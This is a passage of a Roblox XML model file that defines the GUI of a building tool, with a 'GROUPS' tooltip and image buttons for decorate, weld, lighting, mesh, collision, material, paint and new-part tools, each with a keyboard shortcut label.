										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXC48FF9A6CD8B4755942A7C1DC8F88DB4">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Tooltip</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>-0.300000012</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1.60000002</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">false</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBX8C1D57FEC4784900A04EC7378A435DFE">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4278190080</Color3>
												<float name="BackgroundTransparency">0.5</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Text</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>28</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"><![CDATA[GROUPS
(Shift + G)]]></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX93EBF58D57BD4C52989A7DF8BA8963C7">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.600000024</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ToolButtons</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>70</XO>
										<YS>0</YS>
										<YO>245</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="ImageButton" referent="RBXE14A5F2903624F90A92FD59A0F71557D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741412</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">DecorateButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>210</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX036DA77CD0E2498893B434436B671E10">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">P</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX9BF20524352A4FFE998AB40A23E3AEF9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741418</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">WeldButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>175</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX156368223757412B888B8E1FE9654E7F">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">F</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBXD665E653D1A54C2BA6FE9478A601085D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741341</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">LightingButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>210</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX48545C75EE7A410984E09B425E6106CE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">U</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX51A72234BDD8470E9FFF0782EB204D7D">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141806786</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">MeshButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>140</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX2FDBD637F093472D9AC10E2C0E7A2ED8">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">H</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX99BEFC513D6848AA9D9CE16E6C80085C">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141809596</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">CollisionButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>105</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX21D15AC1B48F46CCB03B26D9D60944F3">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">K</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX78D234A98C2D4D81ABA5173E84B7CF69">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4285215356</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141809090</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">MaterialButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>70</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXEBA20057DF864E30B4E464B4420A3ADF">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">N</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBX5444819A17E1464CA067C7A82861C219">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4294901760</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741444</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">PaintButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>35</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBXD399C0CA9F204CBC9F083FEF383AACAE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4278190080</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">2</token>
											<string name="Name">Shortcut</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>13</XO>
												<YS>0</YS>
												<YO>13</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">V</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">10</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="ImageButton" referent="RBXC41161E68C254D2D9CA8EED1DC260659">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">false</bool>
										<Color3 name="BackgroundColor3">4279308561</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=141741393</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">NewPartButton</string>
